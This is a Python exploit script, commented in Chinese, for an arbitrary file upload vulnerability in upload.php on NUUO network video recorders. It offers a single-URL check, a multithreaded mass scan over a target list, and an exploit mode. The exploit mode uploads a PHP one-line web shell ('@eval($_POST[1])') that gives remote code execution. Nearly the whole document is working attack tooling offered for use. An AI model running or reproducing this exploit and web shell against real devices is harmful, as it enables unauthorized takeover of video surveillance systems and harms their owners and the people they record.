import requests
import argparse

requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def check(target):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=--------ok4o88lom'
    }
    data = '''----------ok4o88lom
Content-Disposition: form-data; name="userfile"; filename="test.php"
 
<?php phpinfo();@unlink(__FILE__);?>
----------ok4o88lom--
    
    '''
    url = f'{target}/upload.php'
    try:
        r = requests.post(url, headers=headers, data=data, verify=False, timeout=10)

        if r.status_code == 200 and "test.php" in r.text:
            print(f"{target}[*]存在该漏洞")
        else:
            print(f"{target}[-]不存在该漏洞")
    except Exception as e:
        print(f"{target}[-]访问超时")
def expp(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=--------ok4o88lom'
    }
    data = '''----------ok4o88lom
Content-Disposition: form-data; name="userfile"; filename="test.php"
 
<?php @eval($_POST[1]);@unlink(__FILE__);?>
----------ok4o88lom--
    
    '''
    url = f'{url}/upload.php'
    try:
        r = requests.post(url, headers=headers, data=data, verify=False, timeout=5)

        if r.status_code == 200 and "test.php" in r.text:
            print(f"{url}[*]一句话木马注入成功")
        else:
            print(f"{target}[-]一句话木马注入失败")
    except Exception as e:
        print(f"{target}[-]访问超时")






if __name__ == '__main__':
    banner = """
     .----------------.  .----------------.  .----------------.  .----------------. 
    | .--------------. || .--------------. || .--------------. || .--------------. |
    | | ____    ____ | || |      __      | || |     _____    | || |  ___  ____   | |
    | ||_   \  /   _|| || |     /  \     | || |    |_   _|   | || | |_  ||_  _|  | |
    | |  |   \/   |  | || |    / /\ \    | || |      | |     | || |   | |_/ /    | |
    | |  | |\  /| |  | || |   / ____ \   | || |   _  | |     | || |   |  __'.    | |
    | | _| |_\/_| |_ | || | _/ /    \ \_ | || |  | |_' |     | || |  _| |  \ \_  | |
    | ||_____||_____|| || ||____|  |____|| || |  `.___.'     | || | |____||____| | |
    | |              | || |              | || |              | || |              | |
    | '--------------' || '--------------' || '--------------' || '--------------' |
    '----------------'  '----------------'  '----------------'  '----------------' 


    """
    print(banner)
    parse = argparse.ArgumentParser(description="NUUO网络视频录像机 upload.php 存在任意文件上传漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='输入要验证漏洞的url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='输入要验证漏洞的文件txt')
    parse.add_argument('-exp', '--export', dest='exp', type=str, help='输入要漏洞利用的url')
    args = parse.parse_args()
    pool = Pool(30)
if args.url:
    if "http" in args.url:
        check(args.url)
    else:
        t2 = f"http://{args.url}"
        check(t2)
        t3 = f"https://{args.url}"
        check(t3)
elif args.file:
    f1 = open(args.file, 'r')
    targets = []
    for l in f1.readlines():
        l = l.strip()
        if "http" in l:
            target = f"{l}"
            targets.append(target)
        else:
            target = f"http://{l}"
            targets.append(target)
            target2 = f"https://{l}"
            targets.append(target2)
    pool.map(check, targets)
    pool.close()
elif args.exp:

    expp(args.exp)
